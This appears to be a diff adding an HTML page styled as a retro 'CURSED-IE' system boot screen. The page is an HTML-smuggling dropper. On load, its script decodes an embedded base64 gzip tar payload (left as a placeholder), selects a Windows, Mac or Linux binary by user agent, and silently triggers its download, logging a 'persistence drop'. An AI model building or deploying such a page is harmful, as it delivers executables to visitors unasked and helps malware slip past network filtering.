@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CURSED-IE // SYSTEM BOOT</title>
+    <script>
+        __PAKO_MIN_JS__
+    </script>
+    <style>
+        :root {
+            --neon-green: #39ff14;
+            --dark-green: #052d06;
+            --crt-bg: #0a0a0a;
+        }
+
+        body {
+            background-color: var(--crt-bg);
+            color: var(--neon-green);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* No scrollbars for the CRT feel */
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        /* --- CRT Scanline & Flicker Effects --- */
+        body::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 4px, 3px 100%;
+            pointer-events: none;
+        }
+
+        body::after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: rgba(18, 16, 16, 0.1);
+            opacity: 0;
+            z-index: 2;
+            pointer-events: none;
+            animation: flicker 0.15s infinite;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.27861; }
+            5% { opacity: 0.34769; }
+            /* ... skipping frames for brevity ... */
+            100% { opacity: 0.24387; }
+        }
+
+        /* --- UI Layout --- */
+        .container {
+            position: relative;
+            padding: 40px;
+            height: 100vh;
+            box-sizing: border-box;
+            z-index: 1;
+        }
+
+        .header {
+            border-bottom: 2px solid var(--neon-green);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .status-bar {
+            background: var(--dark-green);
+            padding: 5px 10px;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        #log {
+            font-size: 16px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            height: calc(100% - 150px);
+            overflow-y: auto;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: var(--neon-green);
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        /* Glitch Effect for Errors */
+        .error {
+            color: #ff3131;
+            text-shadow: 0 0 5px #ff3131;
+            font-weight: bold;
+        }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--crt-bg); }
+        ::-webkit-scrollbar-thumb { background: var(--neon-green); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span>[CURSED-IE] v0.67.67</span>
+            <span id="clock">MEM_PTR: 0x00000000</span>
+        </div>
+        
+        <div class="status-bar">
+            HARDWARE_AUTH: GRANTED // SESSION: LOTL_BYPASS // TARGET: MULTI-ARCH
+        </div>
+
+        <div id="log">BOOTING KERNEL...</div>
+        <span class="cursor"></span>
+    </div>
+
+    <script>
+        const PAYLOAD = "__PAYLOAD__"; 
+        
+        const logElement = document.getElementById("log");
+        const log = (x, type = "") => {
+            const span = document.createElement("span");
+            if (type === "error") span.className = "error";
+            span.textContent = `\n[SYS_MSG] ${x}`;
+            logElement.appendChild(span);
+            logElement.scrollTop = logElement.scrollHeight;
+            
+            // Randomize the memory pointer in the header for flair
+            document.getElementById("clock").textContent = `MEM_PTR: 0x${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}`;
+        };
+
+        function getPlatform() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes("win")) return "windows";
+            if (ua.includes("mac")) return "mac";
+            return "linux";
+        }
+
+        function untar(buf) {
+            let offset = 0; const files = {};
+            while (offset + 512 <= buf.length) {
+                const h = buf.slice(offset, offset + 512);
+                const name = new TextDecoder().decode(h.slice(0, 100)).replace(/\0/g, '');
+                if (!name) break;
+                const size = parseInt(new TextDecoder().decode(h.slice(124, 136)).trim(), 8);
+                offset += 512;
+                files[name] = buf.slice(offset, offset + size);
+                offset += Math.ceil(size / 512) * 512;
+            }
+            return files;
+        }
+
+        // Functional Logic
+        (async function autoRun() {
+            try {
+                await new Promise(r => setTimeout(r, 800)); // Dramatic delay
+                log(`IDENTIFYING HOST... ARCH_DETECTED: ${getPlatform().toUpperCase()}`);
+                
+                log("INTERROGATING PAYLOAD STRING...");
+                const bin = atob(PAYLOAD.replace(/[^A-Za-z0-9+/=]/g, ""));
+                const bytes = new Uint8Array(bin.length);
+                for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+                
+                log("DECOMPRESSING GZIP ARCHIVE (IN-MEMORY)...");
+                const data = pako.ungzip(bytes);
+                
+                log("PARSING USTAR FILE_TABLE...");
+                const archive = untar(data);
+
+                const map = { "windows": "cursed.exe", "mac": "cursed-mac", "linux": "cursed-linux" };
+                const target = map[getPlatform()];
+
+                if (archive[target]) {
+                    log(`NATIVE_TARGET [${target}] ISOLATED.`);
+                    log("TRIGGERING PERSISTENCE DROP...");
+                    
+                    const blob = new Blob([archive[target]], { type: "application/octet-stream" });
+                    const a = document.createElement("a");
+                    a.href = URL.createObjectURL(blob);
+                    a.download = target;
+                    a.click();
+                    
+                    log("SUCCESS: BINARY EXFILTRATED TO USER_SPACE.");
+                } else {
+                    log(`FAILURE: TARGET [${target}] NOT FOUND IN PAYLOAD.`, "error");
+                }
+            } catch (e) { 
+                log(`FATAL_EXCEPTION: ${e.message}`, "error"); 
+            }
+        })();
+    </script>
+</body>
+</html>
